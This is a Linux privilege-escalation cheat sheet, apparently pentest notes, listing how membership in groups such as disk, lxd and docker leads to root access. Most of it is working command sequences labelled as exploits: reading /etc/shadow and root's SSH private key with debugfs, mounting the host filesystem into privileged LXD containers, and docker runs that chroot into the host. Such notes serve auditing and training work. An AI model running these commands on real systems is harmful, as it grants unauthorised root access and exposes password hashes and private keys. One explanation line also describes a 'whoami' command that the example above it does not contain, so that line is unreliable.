## adm
Members can read many log files in `/var/log` and use `xconsole`
## shadow
Members can read the /etc/shadow file
## sudo/admin/wheel
sudo/admin (in Debian derivatives) or wheel (in CentOS/RedHat derivatives) group is a special user group used to control access to the su or sudo commands, which allow users to either execute commands or masquerade as another user (usually the super user)
## mlocate
Members can read database of indexed files located at `var/lib/mlocate/mlocate.db`
```
cat /var/lib/mlocate/mlocate.db | strings | grep personal -A 3 -B 3
```
## disk
Members have access to the raw data contained in disks and partitions

Show disk space usage in human-readable format
```
df -h
```
Open File System
```
debugfs <FILESYSTEM>
```
Read files
```
debugfs: cat /etc/shadow
debugfs: cat /root/.ssh/id_rsa
```
Write files
```
debugfs -w /dev/sda1
debugfs: dump /tmp/asd1.txt /tmp/asd2.txt
```
## lxd/lxc
Members have write access to the LXD socket and can perform privileged actions, such as creating a root-level privilege container because LXD does not try to match the current users privileges

### Exploit 1
Build a simple alpine image
```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine -a i686
```
Import the image
```
lxc image import ./alpine.tar.gz --alias myimage
```
Run the image
```
lxc init myimage mycontainer -c security.privileged=true
```
Mount the /root into the image
```
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
Interact with the container
```
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
### Exploit 2
Install [distrobuilder](https://github.com/lxc/distrobuilder)

Make distrobuilder
```
cd $HOME/go/src/github.com/lxc/distrobuilder
make
```
Create alphine
```
mkdir -p $HOME/ContainerImages/alpine && cd ContainerImages/alpine
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```
Create container
```
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```
Upload `lxd.tar.xz` and `rootfs.squashfs`

Add image
```
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
Create container and add root path
```
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Execute the container
```
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
## docker
Members have access to manage, create, edit or delete docker containers

### Exploit 1
```
sudo docker run -v /:/mnt --rm -it <IMAGE> chroot /mnt sh
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
- `docker run`: Runs a new container from an image.
- `--rm`: Automatically removes the container once it exits.
- `-it`: Combines `-i` (interactive mode) and `-t` (allocates a pseudo-TTY), allowing interaction with the container's shell.
- `alpine`: The name of the Docker image being used (a lightweight Linux distribution).
- `sh -c "whoami"`: Executes the `whoami` command within the container using the shell (`sh`). `whoami` will return the name of the current user inside the container.
### Exploit 2
```
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```
